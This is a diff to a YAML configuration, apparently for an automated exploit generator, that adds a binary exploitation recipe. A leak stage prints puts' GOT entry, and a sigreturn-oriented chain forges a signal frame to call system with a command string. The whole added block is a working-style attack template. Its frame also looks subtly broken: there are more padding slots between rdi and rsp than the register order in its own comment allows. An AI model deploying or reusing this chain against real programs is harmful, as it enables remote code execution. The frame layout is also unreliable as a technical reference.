@@ -28,6 +28,39 @@ mcts:
   terminal: true
   success: 0.45
 
+build:
+  technique: setcontext_srop
+  # the classic SROP door: pop rax=15, a libc `syscall; ret` gadget,
+  # then the forged rt_sigreturn frame rides the payload itself. The
+  # frame's gregs follow glibc's enum order (R8..R15, RDI, RSI, RBP,
+  # RBX, RDX, RAX, RCX, RSP, RIP, EFL, CSGSFS, ERR, TRAPNO, OLDMASK,
+  # CR2). The frame's rsp lands on the staging buffer (.bss, the
+  # exploit's own stack), rdi = the command string, rip = the libc
+  # system symbol. The leak stage rides the echo (puts(GOT[puts])).
+  variants:
+    - name: leak_stage
+      layout:
+        - [padding, measured_offset]
+        - [chain, "gadget:pop_rdi_ret", "got_addr:puts", "plt_addr:puts"]
+    - name: strike
+      layout:
+        - [padding, measured_offset]
+        - [chain, "gadget:pop_rax_ret", "const:15", "gadget:syscall_ret",
+           "const:0", "const:0", "const:0", "const:0", "const:0",
+           "const:0", "const:0", "const:0", "const:0", "const:0",
+           "const:0", "const:0", "const:0",
+           "leak:sh_cmd", "const:0", "const:0", "const:0", "const:0",
+           "const:0", "const:0", "const:0", "const:0", "const:0",
+           "const:0", "const:0", "const:0", "const:0", "const:0",
+           "const:0",
+           "sym:staging",
+           "leak:system",
+           "const:514", "const:51",
+           "const:0", "const:0", "const:0", "const:0",
+           "const:0",
+           "const:0", "const:0", "const:0", "const:0", "const:0",
+           "const:0", "const:0", "const:0"]
+
 priors: [7, 13]
 
 
